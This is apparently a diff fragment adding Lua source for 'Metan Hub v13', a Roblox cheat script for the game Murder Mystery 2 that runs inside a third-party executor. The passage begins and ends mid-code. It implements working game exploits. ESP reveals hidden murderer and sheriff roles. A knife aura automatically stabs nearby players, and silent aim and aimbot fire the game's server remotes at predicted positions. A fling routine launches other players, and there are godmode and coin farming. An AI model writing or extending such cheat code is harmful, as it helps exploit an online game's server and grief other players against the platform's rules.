+    Dialog = Color3.fromRGB(18, 14, 8), DialogHolder = Color3.fromRGB(10, 8, 4), DialogHolderLine = Color3.fromRGB(160, 120, 30),\
+    DialogButton = Color3.fromRGB(38, 30, 15), DialogButtonBorder = Color3.fromRGB(200, 150, 40), DialogBorder = Color3.fromRGB(200, 150, 40),\
+    DialogInput = Color3.fromRGB(25, 20, 10), DialogInputLine = Color3.fromRGB(255, 200, 100),\
+    Text = Color3.fromRGB(255, 250, 230), SubText = Color3.fromRGB(220, 200, 150), Hover = Color3.fromRGB(65, 52, 25), HoverChange = 0.05,\
+    ShineEnabled = true, Shine = { Speed = 0.5, RotationSpeed = 25, ColorSequence = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 90, 20)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 220, 100)), ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 90, 20)) }) },\
+    StrokeShine = true, StrokeDark = Color3.fromRGB(100, 70, 20),\
+    ButtonGradient = { Background = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 90, 20)), ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 45, 10)) }),\
+        Stroke = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 170, 60)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 220, 120)), ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 170, 60)) }) },\
+    Background = \"rbxassetid://90908656139712\", BackgroundTransparency = 0.15,\
+})\
+if #themes == 0 then themes = {\"Dark\", \"Light\", \"Blood Red\", \"Amoled\", \"EmeraldDark\", \"NeonBlue\", \"Sunset\", \"SlateAnimated\"} _G.Theme = \"Dark\" end\
+local isMobile = UserInputService.TouchEnabled\
+local windowSize = isMobile and UDim2.fromOffset(480, 380) or UDim2.fromOffset(640, 520)\
+local Window = Fluent:CreateWindow({\
+    Title = \"Metan Hub v13\",\
+    SubTitle = \"MM2\",\
+    TabWidth = isMobile and 110 or 150,\
+    Size = windowSize,\
+    Acrylic = true,\
+    Theme = themes[1],\
+    MinimizeKey = Enum.KeyCode.RightShift\
+})\
+local toggleGui = Instance.new(\"ScreenGui\")\
+toggleGui.Name = \"OpenUi\"\
+toggleGui.Parent = LocalPlayer:WaitForChild(\"PlayerGui\")\
+toggleGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\
+toggleGui.ResetOnSpawn = false\
+local mainBtn = Instance.new(\"TextButton\")\
+mainBtn.Name = \"OpenButton\"\
+mainBtn.Parent = toggleGui\
+mainBtn.BackgroundColor3 = Color3.fromRGB(35,35,35)\
+mainBtn.BackgroundTransparency = 1\
+mainBtn.Position = isMobile and UDim2.new(0.05, 0, 0.15, 0) or UDim2.new(0.102,0,0.11,0)\
+mainBtn.Size = isMobile and UDim2.new(0,48,0,32) or UDim2.new(0,64,0,42)\
+mainBtn.Text = \"\"\
+mainBtn.Visible = true\
+Instance.new(\"UICorner\", mainBtn)\
+local frontImage = Instance.new(\"ImageLabel\")\
+frontImage.Name = \"StaticIcon\"\
+frontImage.Parent = mainBtn\
+frontImage.Size = isMobile and UDim2.fromOffset(40,40) or UDim2.fromOffset(55,55)\
+frontImage.Position = UDim2.new(0.5,0,0.5,0)\
+frontImage.AnchorPoint = Vector2.new(0.5,0.5)\
+frontImage.BackgroundTransparency = 1\
+frontImage.Image = \"rbxassetid://73265327699098\"\
+frontImage.ZIndex = 1\
+Instance.new(\"UICorner\", frontImage).CornerRadius = UDim.new(0.2,0)\
+local function MakeDraggable(topbar, obj)\
+    local dragging, dragInput, dragStart, startPos = false, nil, nil, nil\
+    local holding, holdToken = false, 0\
+    obj:SetAttribute(\"Locked\", false)\
+    local function Update(input)\
+        if obj:GetAttribute(\"Locked\") then return end\
+        local delta = input.Position - dragStart\
+        obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)\
+    end\
+    local function ToggleLock()\
+        local newState = not obj:GetAttribute(\"Locked\")\
+        obj:SetAttribute(\"Locked\", newState)\
+    end\
+    topbar.InputBegan:Connect(function(input)\
+        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end\
+        dragging = not obj:GetAttribute(\"Locked\"); holding = true; dragStart = input.Position; startPos = obj.Position\
+        holdToken = holdToken + 1; local token = holdToken\
+        task.delay(1.0, function() if holding and token == holdToken then ToggleLock() end end)\
+        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false holding = false end end)\
+    end)\
+    topbar.InputChanged:Connect(function(input)\
+        if not dragStart then return end\
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then\
+            if (input.Position - dragStart).Magnitude > 6 then holding = false end\
+            dragInput = input\
+        end\
+    end)\
+    UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then Update(input) end end)\
+end\
+MakeDraggable(mainBtn, mainBtn)\
+local uiVisible = true\
+mainBtn.MouseButton1Click:Connect(function()\
+    uiVisible = not uiVisible\
+    if uiVisible then Window:Show() else Window:Hide() end\
+end)\
+_G.TargetTracking = {}  \
+local currentRoles = {}\
+local savedPlayerData = {}\
+local gunDropCache = {}\
+local FlingActive = false\
+getgenv().OldPos = nil\
+getgenv().FPDH = workspace.FallenPartsDestroyHeight\
+local killAllActive = false\
+local spaceHeld = false\
+local lastJumpTime = 0\
+local inRound = false\
+local isDead = false\
+local BOMB_CONFIG = {\
+    BombDuration = 5, JumpPowerOverride = 50,\
+    PredictFactor = 0.045, VerticalOffset = -1.5,\
+    MeshId = \"http://www.roblox.com/asset/?id=104516854\",\
+    TextureId = \"http://www.roblox.com/asset/?id=104516981\",\
+    ToolName = \"💣 Predict Bomb\"\
+}\
+_G.WalkSpeed = 16\
+_G.JumpPower = 50\
+_G.ExtremeFlingEnabled = false\
+_G.SpeedGlitchEnabled = false\
+_G.GlitchSpeed = 35\
+_G.WhitelistEnabled = false\
+_G.WhitelistFriends = false\
+_G.WhitelistPlayers = {}\
+_G.EspEnabled = false\
+_G.AutoGrabEnabled = false\
+_G.GunEspEnabled = false\
+_G.SayRoleEnabled = false\
+_G.NoclipEnabled = false\
+_G.FlyEnabled = false\
+_G.FlySpeed = 50\
+_G.AntiAfkEnabled = true\
+_G.FOVValue = 70\
+_G.Theme = themes[1]\
+_G.SilentAimEnabled = false\
+_G.SilentAimKey = \"E\"\
+_G.SilentAimMobile = false\
+_G.NamesESP = false\
+_G.TrapESP = false\
+_G.EasyGlitch = false\
+_G.Invisibility = false\
+_G.CoinFarmEnabled = false\
+_G.XrayEnabled = false\
+_G.AntiTrapEnabled = false\
+_G.AntiFlingEnabled = false\
+_G.AutoBreakGun = false\
+_G.KnifeAuraEnabled = false\
+_G.KnifeAuraRange = 20\
+_G.FastThrowEnabled = false\
+_G.FastThrowKey = \"E\"\
+_G.KnifeSilentAimEnabled = false\
+_G.KnifeSilentAimKey = \"R\"\
+_G.AimbotEnabled = false\
+_G.AimbotKey = \"Q\"\
+_G.ImproveFPS = false\
+_G.RTXShaders = false\
+_G.KorbloxEnabled = false\
+_G.HeadlessEnabled = false\
+_G.CoinFarmSpeed = 1.0\
+_G.CoinType = \"Coin and BeachBall\"\
+_G.MurdFill = Color3.fromRGB(255,0,0)\
+_G.MurdFillTrans = 0.4\
+_G.MurdOutline = Color3.fromRGB(255,255,255)\
+_G.MurdOutlineTrans = 0.1\
+_G.SheriffFill = Color3.fromRGB(0,0,255)\
+_G.SheriffFillTrans = 0.4\
+_G.SheriffOutline = Color3.fromRGB(255,255,255)\
+_G.SheriffOutlineTrans = 0.1\
+_G.InnocentFill = Color3.fromRGB(0,255,0)\
+_G.InnocentFillTrans = 0.4\
+_G.InnocentOutline = Color3.fromRGB(255,255,255)\
+_G.InnocentOutlineTrans = 0.1\
+_G.LobbyFill = Color3.fromRGB(255,255,255)\
+_G.LobbyFillTrans = 1\
+_G.LobbyOutline = Color3.fromRGB(255,255,255)\
+_G.LobbyOutlineTrans = 0.3\
+_G.GunFill = Color3.fromRGB(255,255,0)\
+_G.GunFillTrans = 0.3\
+_G.GunOutline = Color3.fromRGB(255,255,255)\
+_G.GunOutlineTrans = 0.0\
+local SETTINGS_FILE = \"MetanHub_FluentPro_Settings.json\"\
+local function saveSettings()\
+    if not writefile then return end\
+    local data = {}\
+    for k,v in pairs(_G) do\
+        local t = type(v)\
+        if t == \"string\" or t == \"number\" or t == \"boolean\" then data[k] = v\
+        elseif t == \"table\" and k == \"WhitelistPlayers\" then\
+            local wl = {}\
+            for name in pairs(v) do table.insert(wl, name) end\
+            data[\"WhitelistPlayers\"] = wl\
+        elseif t == \"userdata\" and typeof(v) == \"Color3\" then data[k] = {v.R, v.G, v.B} end\
+    end\
+    writefile(SETTINGS_FILE, HttpService:JSONEncode(data))\
+end\
+local function loadSettings()\
+    if not readfile or not isfile or not isfile(SETTINGS_FILE) then return false end\
+    local success, json = pcall(function() return readfile(SETTINGS_FILE) end)\
+    if not success or not json then return false end\
+    local success2, data = pcall(function() return HttpService:JSONDecode(json) end)\
+    if not success2 or not data then return false end\
+    for k,v in pairs(data) do\
+        if k == \"WhitelistPlayers\" then\
+            local wl = {}\
+            for _, name in ipairs(v) do wl[name] = true end\
+            _G.WhitelistPlayers = wl\
+        elseif type(v) == \"table\" and #v == 3 then _G[k] = Color3.new(v[1], v[2], v[3])\
+        else _G[k] = v end\
+    end\
+    pcall(function() Fluent:SetTheme(_G.Theme) end)\
+    return true\
+end\
+local function getPlayersNames()\
+    local t = {}\
+    for _, p in ipairs(Players:GetPlayers()) do\
+        if p ~= LocalPlayer then table.insert(t, p.Name) end\
+    end\
+    table.sort(t)\
+    return t\
+end\
+local function isWhitelisted(pl)\
+    if not _G.WhitelistEnabled then return false end\
+    if _G.WhitelistFriends then\
+        local ok, fr = pcall(function() return LocalPlayer:IsFriendsWith(pl.UserId) end)\
+        if ok and fr then return true end\
+    end\
+    if _G.WhitelistPlayers and _G.WhitelistPlayers[pl.Name] then return true end\
+    return false\
+end\
+local function scanRoles()\
+    for _, p in ipairs(Players:GetPlayers()) do\
+        local char = p.Character\
+        if char then\
+            local bp = p:FindFirstChild(\"Backpack\")\
+            if char:FindFirstChild(\"Knife\") or (bp and bp:FindFirstChild(\"Knife\")) then\
+                currentRoles[p.Name] = \"Murderer\"\
+            elseif char:FindFirstChild(\"Gun\") or (bp and bp:FindFirstChild(\"Gun\")) then\
+                currentRoles[p.Name] = \"Sheriff\"\
+            else\
+                currentRoles[p.Name] = nil\
+            end\
+        else\
+            currentRoles[p.Name] = nil\
+        end\
+    end\
+end\
+local function getTargetByRole(role)\
+    scanRoles()\
+    for name, r in pairs(currentRoles) do\
+        if r == role then\
+            local pl = Players:FindFirstChild(name)\
+            if pl and pl ~= LocalPlayer and pl.Character then return pl end\
+        end\
+    end\
+    return nil\
+end\
+local function getMyRole()\
+    local r = currentRoles[LocalPlayer.Name]\
+    if not r and savedPlayerData[LocalPlayer.Name] then\
+        r = savedPlayerData[LocalPlayer.Name].Role\
+    end\
+    return r or \"Unknown\"\
+end\
+local function clearESP()\
+    for _, p in ipairs(Players:GetPlayers()) do\
+        if p.Character then\
+            local hl = p.Character:FindFirstChild(\"PreEspHighlight\")\
+            if hl then hl:Destroy() end\
+            local bg = p.Character:FindFirstChild(\"EspNameTag\")\
+            if bg then bg:Destroy() end\
+        end\
+    end\
+    for _, v in pairs(gunDropCache) do\
+        local hl = v:FindFirstChild(\"GunDropHighlight\")\
+        if hl then hl:Destroy() end\
+    end\
+end\
+local function updateESP(player)\
+    if player == LocalPlayer then return end\
+    local char = player.Character\
+    if not char then return end\
+    local data = savedPlayerData[player.Name]\
+    if data and (data.Dead or data.Killed) then\
+        local hl = char:FindFirstChild(\"PreEspHighlight\")\
+        if hl then hl:Destroy() end\
+        local bg = char:FindFirstChild(\"EspNameTag\")\
+        if bg then bg:Destroy() end\
+        return\
+    end\
+    local role = currentRoles[player.Name] or (data and data.Role)\
+    local hl = char:FindFirstChild(\"PreEspHighlight\") or Instance.new(\"Highlight\")\
+    hl.Name = \"PreEspHighlight\"\
+    hl.Parent = char\
+    if role == \"Murderer\" then\
+        hl.FillColor = _G.MurdFill\
+        hl.FillTransparency = _G.MurdFillTrans\
+        hl.OutlineColor = _G.MurdOutline\
+        hl.OutlineTransparency = _G.MurdOutlineTrans\
+    elseif role == \"Sheriff\" then\
+        hl.FillColor = _G.SheriffFill\
+        hl.FillTransparency = _G.SheriffFillTrans\
+        hl.OutlineColor = _G.SheriffOutline\
+        hl.OutlineTransparency = _G.SheriffOutlineTrans\
+    elseif role == \"Innocent\" then\
+        hl.FillColor = _G.InnocentFill\
+        hl.FillTransparency = _G.InnocentFillTrans\
+        hl.OutlineColor = _G.InnocentOutline\
+        hl.OutlineTransparency = _G.InnocentOutlineTrans\
+    else\
+        hl.FillColor = _G.LobbyFill\
+        hl.FillTransparency = _G.LobbyFillTrans\
+        hl.OutlineColor = _G.LobbyOutline\
+        hl.OutlineTransparency = _G.LobbyOutlineTrans\
+    end\
+    if _G.NamesESP then\
+        local head = char:FindFirstChild(\"Head\")\
+        if head then\
+            local billboard = char:FindFirstChild(\"EspNameTag\") or Instance.new(\"BillboardGui\")\
+            billboard.Name = \"EspNameTag\"\
+            billboard.Parent = char\
+            billboard.AlwaysOnTop = true\
+            billboard.Size = UDim2.new(0, 200, 0, 50)\
+            billboard.StudsOffset = Vector3.new(0, 2.5, 0)\
+            billboard.MaxDistance = 500\
+            local label = billboard:FindFirstChild(\"TextLabel\") or Instance.new(\"TextLabel\")\
+            label.Name = \"TextLabel\"\
+            label.Parent = billboard\
+            label.Size = UDim2.new(1, 0, 1, 0)\
+            label.BackgroundTransparency = 1\
+            label.Text = player.Name\
+            label.TextScaled = true\
+            label.Font = Enum.Font.SourceSansBold\
+            label.TextStrokeTransparency = 0.5\
+            if role == \"Murderer\" then\
+                label.TextColor3 = _G.MurdFill\
+            elseif role == \"Sheriff\" then\
+                label.TextColor3 = _G.SheriffFill\
+            elseif role == \"Innocent\" then\
+                label.TextColor3 = _G.InnocentFill\
+            else\
+                label.TextColor3 = Color3.fromRGB(255, 255, 255)\
+            end\
+        end\
+    else\
+        local bg = char:FindFirstChild(\"EspNameTag\")\
+        if bg then bg:Destroy() end\
+    end\
+end\
+local function toggleXray(v)\
+    _G.XrayEnabled = v\
+    local function scan(z, t)\
+        for _, i in pairs(z:GetChildren()) do\
+            if i:IsA(\"BasePart\") and not i.Parent:FindFirstChild(\"Humanoid\") and not i.Parent.Parent:FindFirstChild(\"Humanoid\") then\
+                i.LocalTransparencyModifier = t\
+            end\
+            scan(i, t)\
+        end\
+    end\
+    scan(workspace, v and 0.9 or 0)\
+end\
+local antiTrapConn\
+local function toggleAntiTrap(v)\
+    _G.AntiTrapEnabled = v\
+    if v then\
+        antiTrapConn = RunService.Heartbeat:Connect(function()\
+            local char = LocalPlayer.Character\
+            if char and char:FindFirstChildOfClass(\"Humanoid\") then\
+                local hum = char:FindFirstChildOfClass(\"Humanoid\")\
+                if hum.WalkSpeed == 0.01 then\
+                    hum.WalkSpeed = _G.WalkSpeed\
+                end\
+            end\
+        end)\
+    else\
+        if antiTrapConn then\
+            antiTrapConn:Disconnect()\
+            antiTrapConn = nil\
+        end\
+    end\
+end\
+local antiFlingDetectedPlayers = {}\
+local antiFlingNeutralizeConn = nil\
+local antiFlingDetectConn = nil\
+local function toggleAntiFling(v)\
+    _G.AntiFlingEnabled = v\
+    if v then\
+        antiFlingDetectConn = RunService.Heartbeat:Connect(function()\
+            for _, pl in ipairs(Players:GetPlayers()) do\
+                if pl.Character and pl.Character:IsDescendantOf(workspace) and pl.Character.PrimaryPart then\
+                    local angular = pl.Character.PrimaryPart.AssemblyAngularVelocity.Magnitude\
+                    local linear = pl.Character.PrimaryPart.AssemblyLinearVelocity.Magnitude\
+                    if angular > 50 or linear > 100 then\
+                        if not antiFlingDetectedPlayers[pl.Name] then\
+                            Notify(\"Anti-Fling\", \"Flinger detected: \" .. pl.Name, \"Warning\", nil, 5)\
+                            antiFlingDetectedPlayers[pl.Name] = true\
+                        end\
+                        for _, part in ipairs(pl.Character:GetDescendants()) do\
+                            if part:IsA(\"BasePart\") then\
+                                part.CanCollide = false\
+                                part.AssemblyAngularVelocity = Vector3.zero\
+                                part.AssemblyLinearVelocity = Vector3.zero\
+                                part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0)\
+                            end\
+                        end\
+                    end\
+                end\
+            end\
+        end)\
+        antiFlingNeutralizeConn = RunService.Heartbeat:Connect(function()\
+            if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then\
+                local root = LocalPlayer.Character.PrimaryPart\
+                if root.AssemblyLinearVelocity.Magnitude > 250 or root.AssemblyAngularVelocity.Magnitude > 250 then\
+                    root.AssemblyLinearVelocity = Vector3.zero\
+                    root.AssemblyAngularVelocity = Vector3.zero\
+                    if getgenv().OldPos then\
+                        root.CFrame = getgenv().OldPos\
+                    end\
+                else\
+                    getgenv().OldPos = root.CFrame\
+                end\
+            end\
+        end)\
+    else\
+        if antiFlingDetectConn then antiFlingDetectConn:Disconnect() end\
+        if antiFlingNeutralizeConn then antiFlingNeutralizeConn:Disconnect() end\
+        antiFlingDetectedPlayers = {}\
+    end\
+end\
+local function createFakeKnife()\
+    local lp = LocalPlayer\
+    if not lp.Character then\
+        Notify(\"Error\", \"No character\", \"Error\", nil, 2)\
+        return\
+    end\
+    local bp = lp:WaitForChild(\"Backpack\")\
+    if bp:FindFirstChild(\"Fake Knife\") then\
+        Notify(\"Error\", \"Already have fake knife\", \"Error\", nil, 2)\
+        return\
+    end\
+    local tool = Instance.new(\"Tool\")\
+    tool.Name = \"Fake Knife\"\
+    tool.Grip = CFrame.new(0, -1.17, 0.07, 1,0,0,0,1,0,0,0,1)\
+    local handle = Instance.new(\"Part\")\
+    handle.Size = Vector3.new(0.31, 3.42, 1.09)\
+    handle.Name = \"Handle\"\
+    handle.Transparency = 1\
+    handle.Parent = tool\
+    tool.Parent = bp\
+    local anim1 = Instance.new(\"Animation\")\
+    anim1.AnimationId = \"rbxassetid://2467567750\"\
+    local anim2 = Instance.new(\"Animation\")\
+    anim2.AnimationId = \"rbxassetid://1957890538\"\
+    local anims = {anim1, anim2}\
+    lp:GetMouse().Button1Down:Connect(function()\
+        if tool.Parent == lp.Character then\
+            local hum = lp.Character:FindFirstChildOfClass(\"Humanoid\")\
+            if hum then\
+                local an = hum:LoadAnimation(anims[math.random(1,2)])\
+                if an then an:Play() end\
+            end\
+        end\
+    end)\
+    Notify(\"Fake Knife\", \"Created in backpack\", \"Success\", nil, 3)\
+end\
+local function godmode()\
+    local char = LocalPlayer.Character\
+    if not char then return end\
+    local hum = char:FindFirstChildOfClass(\"Humanoid\")\
+    if hum then\
+        hum.Name = \"1\"\
+        local clone = hum:Clone()\
+        clone.Parent = char\
+        clone.Name = \"Humanoid\"\
+        task.wait(0.1)\
+        char[\"1\"]:Destroy()\
+        Camera.CameraSubject = clone\
+        local anim = char:FindFirstChild(\"Animate\")\
+        if anim then\
+            anim.Disabled = true\
+            task.wait(0.1)\
+            anim.Disabled = false\
+        end\
+        Notify(\"Godmode\", \"Active\", \"Success\", nil, 2)\
+    end\
+end\
+local knifeAuraConn\
+local function toggleKnifeAura(v)\
+    _G.KnifeAuraEnabled = v\
+    if v then\
+        knifeAuraConn = RunService.Heartbeat:Connect(function()\
+            local char = LocalPlayer.Character\
+            if not char then return end\
+            local knife = char:FindFirstChild(\"Knife\") or (LocalPlayer.Backpack and LocalPlayer.Backpack:FindFirstChild(\"Knife\"))\
+            if not knife then return end\
+            for _, pl in ipairs(Players:GetPlayers()) do\
+                if pl ~= LocalPlayer and pl.Character and not isWhitelisted(pl) then\
+                    local hrp = pl.Character:FindFirstChild(\"HumanoidRootPart\")\
+                    if hrp and (hrp.Position - char.HumanoidRootPart.Position).Magnitude < _G.KnifeAuraRange then\
+                        if knife.Parent ~= char then\
+                            LocalPlayer.Character.Humanoid:EquipTool(knife)\
+                        end\
+                        local stab = knife:FindFirstChild(\"Stab\")\
+                        if stab then\
+                            stab:FireServer(\"Down\")\
+                        end\
+                        firetouchinterest(hrp, knife.Handle, 1)\
+                        firetouchinterest(hrp, knife.Handle, 0)\
+                    end\
+                end\
+            end\
+        end)\
+    else\
+        if knifeAuraConn then\
+            knifeAuraConn:Disconnect()\
+            knifeAuraConn = nil\
+        end\
+    end\
+end\
+local function getClosestTarget()\
+    local char = LocalPlayer.Character\
+    if not char or not char:FindFirstChild(\"HumanoidRootPart\") then return nil end\
+    local myPos = char.HumanoidRootPart.Position\
+    local closest = nil\
+    local minDist = math.huge\
+    for _, pl in ipairs(Players:GetPlayers()) do\
+        if pl ~= LocalPlayer and pl.Character and pl.Character:FindFirstChild(\"HumanoidRootPart\") and not isWhitelisted(pl) then\
+            local hrp = pl.Character.HumanoidRootPart\
+            local dist = (myPos - hrp.Position).Magnitude\
+            if dist < minDist then\
+                minDist = dist\
+                closest = pl\
+            end\
+        end\
+    end\
+    return closest\
+end\
+local function throwKnifeAt(target)\
+    if not target or not target.Character then return end\
+    local char = LocalPlayer.Character\
+    if not char or not char:FindFirstChild(\"HumanoidRootPart\") then return end\
+    local knife = char:FindFirstChild(\"Knife\") or (LocalPlayer.Backpack and LocalPlayer.Backpack:FindFirstChild(\"Knife\"))\
+    if not knife then return end\
+    local hum = char:FindFirstChildOfClass(\"Humanoid\")\
+    if not hum then return end\
+    if knife.Parent ~= char then\
+        hum:EquipTool(knife)\
+        task.wait(0.1)\
+        knife = char:FindFirstChild(\"Knife\")\
+        if not knife then return end\
+    end\
+    local targetHRP = target.Character:FindFirstChild(\"HumanoidRootPart\")\
+    if not targetHRP then return end\
+    local myHRP = char:FindFirstChild(\"HumanoidRootPart\")\
+    if not myHRP then return end\
+    local targetVel = targetHRP.AssemblyLinearVelocity or Vector3.zero\
+    local dist = (myHRP.Position - targetHRP.Position).Magnitude\
+    local travelTime = dist / 200\
+    local predictedPos = targetHRP.Position + targetVel * travelTime\
+    local throwRemote = knife:FindFirstChild(\"Throw\") or knife:FindFirstChild(\"Remote\")\
+    if throwRemote then\
+        local origin = myHRP.Position\
+        pcall(function()\
+            throwRemote:FireServer(CFrame.lookAt(origin, predictedPos), CFrame.new(predictedPos))\
+        end)\
+    end\
+end\
+local function throwAction()\
+    local char = LocalPlayer.Character\
+    if not char then return end\
+    local knife = char:FindFirstChild(\"Knife\") or (LocalPlayer.Backpack and LocalPlayer.Backpack:FindFirstChild(\"Knife\"))\
+    if not knife then\
+        Notify(\"Throw\", \"No knife found\", \"Warning\", nil, 2)\
+        return\
+    end\
+    local near, dist = nil, math.huge\
+    local myPos = char:FindFirstChild(\"HumanoidRootPart\") and char.HumanoidRootPart.Position or Vector3.zero\
+    for _, pl in ipairs(Players:GetPlayers()) do\
+        if pl ~= LocalPlayer and pl.Character and pl.Character:FindFirstChild(\"HumanoidRootPart\") then\
+            local d = (myPos - pl.Character.HumanoidRootPart.Position).Magnitude\
+            if d < dist then\
+                dist = d\
+                near = pl\
+            end\
+        end\
+    end\
+    if not near or not near.Character or not near.Character:FindFirstChild(\"HumanoidRootPart\") then\
+        Notify(\"Throw\", \"No target found\", \"Warning\", nil, 2)\
+        return\
+    end\
+    local hum = char:FindFirstChildOfClass(\"Humanoid\")\
+    if not hum then return end\
+    if knife.Parent == LocalPlayer.Backpack then\
+        hum:EquipTool(knife)\
+        task.wait(0.1)\
+        knife = char:FindFirstChild(\"Knife\") \
+        if not knife then return end\
+    end\
+    local targetHRP = near.Character.HumanoidRootPart\
+    local myHRP = char.HumanoidRootPart\
+    local origin = myHRP.Position\
+    local targetPos = targetHRP.Position\
+    local remote = knife:FindFirstChild(\"Throw\") or knife:FindFirstChild(\"Remote\")\
+    if not remote then\
+        local events = knife:FindFirstChild(\"Events\")\
+        if events then\
+            remote = events:FindFirstChild(\"KnifeThrown\") or events:FindFirstChild(\"Throw\")\
+        end\
+    end\
+    if not remote then\
+        Notify(\"Throw\", \"Throw remote not found\", \"Error\", nil, 2)\
+        return\
+    end\
+    local args = {\
+        [1] = CFrame.lookAt(origin, targetPos), \
+        [2] = CFrame.new(targetPos)             \
+    }\
+    pcall(function()\
+        remote:FireServer(unpack(args))\
+    end)\
+end\
+local function throwKnife()\
+    throwAction()\
+end\
+local function knifeSilentAim()\
+    throwAction()\
+end\
+local function getMurderer()\
+    for _, p in ipairs(Players:GetPlayers()) do\
+        if p ~= LocalPlayer and p.Character then\
+            local hasKnife = p.Character:FindFirstChild(\"Knife\") or (p.Backpack and p.Backpack:FindFirstChild(\"Knife\"))\
+            if hasKnife then return p end\
+        end\
+    end\
+end\
+local function silentAimShoot()\
+    local char = LocalPlayer.Character\
+    if not char then\
+        Notify(\"SilentAim\", \"No character\", \"Error\", nil, 2)\
+        return\
+    end\
+    local gun = char:FindFirstChild(\"Gun\") or char:FindFirstChild(\"Revolver\") or char:FindFirstChild(\"Pistol\")\
+    if not gun then\
+        Notify(\"SilentAim\", \"No gun equipped\", \"Error\", nil, 2)\
+        return\
+    end\
+    local murderer = getMurderer()\
+    if not murderer or not murderer.Character then\
+        Notify(\"SilentAim\", \"No murderer found\", \"Error\", nil, 2)\
+        return\
+    end\
+    local targetPart = murderer.Character:FindFirstChild(\"Torso\") or murderer.Character:FindFirstChild(\"HumanoidRootPart\")\
+    if not targetPart then\
+        Notify(\"SilentAim\", \"Target has no body part\", \"Error\", nil, 2)\
+        return\
+    end\
+    local targetPos = targetPart.Position\
+    local targetRoot = murderer.Character:FindFirstChild(\"HumanoidRootPart\")\
+    local targetHum = murderer.Character:FindFirstChildOfClass(\"Humanoid\")\
+    if not targetRoot or not targetHum then\
+        Notify(\"SilentAim\", \"Target has no root or humanoid\", \"Error\", nil, 2)\
+        return\
+    end\
+    local origin = gun:FindFirstChild(\"Handle\") or gun:FindFirstChild(\"Gun\") or char.HumanoidRootPart\
+    local originPos = origin.Position\
+    local predicted = targetPos\
+    local track = _G.TargetTracking[murderer.Name]\
+    local now = os.clock()\
+    if track then\
+        local dt = now - track.prevTime\
+        if dt > 0 and dt < 0.5 then\
+            local velocity = (targetRoot.Position - track.prevPos) / dt\
+            local distance = (targetRoot.Position - originPos).Magnitude\
+            local bulletSpeed = 2000\
+            local travelTime = distance / bulletSpeed\
+            local leadTime = travelTime + 0.08 \
+            predicted = targetPos + velocity * leadTime\
+            local maxLead = 10\
+            local leadDist = (predicted - targetPos).Magnitude\
+            if leadDist > maxLead then\
+                predicted = targetPos + (predicted - targetPos).Unit * maxLead\
+            end\
+        end\
+        track.prevPos = targetRoot.Position\
+        track.prevTime = now\
+    else\
+        _G.TargetTracking[murderer.Name] = { prevPos = targetRoot.Position, prevTime = now, velocity = Vector3.zero }\
+    end\
+    local shoot = gun:FindFirstChild(\"Shoot\") or gun:FindFirstChild(\"Fire\")\
+    if shoot then\
+        local aimCF = CFrame.lookAt(originPos, predicted)\
+        pcall(function()\
+            shoot:FireServer(aimCF, CFrame.new(predicted))\
+        end)\
+        pcall(function()\
+            shoot:FireServer(aimCF)\
+        end)\
+    else\
+        Notify(\"SilentAim\", \"Shoot remote not found\", \"Error\", nil, 2)\
+    end\
+end\
+local aimbotActive = false\
+local function toggleAimbot(v)\
+    _G.AimbotEnabled = v\
+    if v then\
+        aimbotActive = true\
+        task.spawn(function()\
+            while aimbotActive do\
+                local sheriff = getTargetByRole(\"Sheriff\")\
+                if sheriff ~= LocalPlayer then\
+                    local murderer = getTargetByRole(\"Murderer\")\
+                    if murderer and murderer.Character then\
+                        local target = murderer.Character:FindFirstChild(\"HumanoidRootPart\")\
+                        if target then\
+                            Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, target.Position)\
+                        end\
+                    end\
+                end\
+                task.wait()\
+            end\
+        end)\
+    else\
+        aimbotActive = false\
+    end\
+end\
+local function flingPlayer(target)\
+    if not target or target == LocalPlayer then return end\
+    local char = LocalPlayer.Character\
+    local hum = char and char:FindFirstChildOfClass(\"Humanoid\")\
+    local root = hum and hum.RootPart\
+    local tchar = target.Character\
+    if not tchar or not root then return end\
+    local thum = tchar:FindFirstChildOfClass(\"Humanoid\")\
+    local troot = thum and thum.RootPart\
+    local thead = tchar:FindFirstChild(\"Head\")\
+    if thum and thum.Sit then return end\
+    local oldSubject = Camera.CameraSubject\
+    if thead then\
+        Camera.CameraSubject = thead\
+    elseif thum then\
+        Camera.CameraSubject = thum\
+    end\
+    if root.Velocity.Magnitude < 50 then\
+        getgenv().OldPos = root.CFrame\
+    end\
+    workspace.FallenPartsDestroyHeight = 0/0\
+    local bv = Instance.new(\"BodyVelocity\")\
+    bv.Parent = root\
+    bv.Velocity = Vector3.zero\
+    bv.MaxForce = Vector3.new(9e9,9e9,9e9)\
+    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\
+    local ang = 0\
+    for i = 1, 150 do\
+        if not FlingActive or not root or not thum then break end\
+        ang = ang + 180\
+        root.CFrame = CFrame.new(troot.Position) * CFrame.new(0, 2.5, 0) * CFrame.Angles(math.rad(ang), 0, 0)\
+        root.Velocity = Vector3.new(2e8, 2.5e9, 2e8)\
+        root.RotVelocity = Vector3.new(2.5e9, 2.5e9, 2.5e9)\
+        task.wait(0.03)\
+    end\
+    bv:Destroy()\
+    for _, part in pairs(char:GetDescendants()) do\
+        if part:IsA(\"BasePart\") then\
+            part.Velocity = Vector3.zero\
+            part.RotVelocity = Vector3.zero\
+        end\
+    end\
+    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\
+    if oldSubject and oldSubject.Parent then\
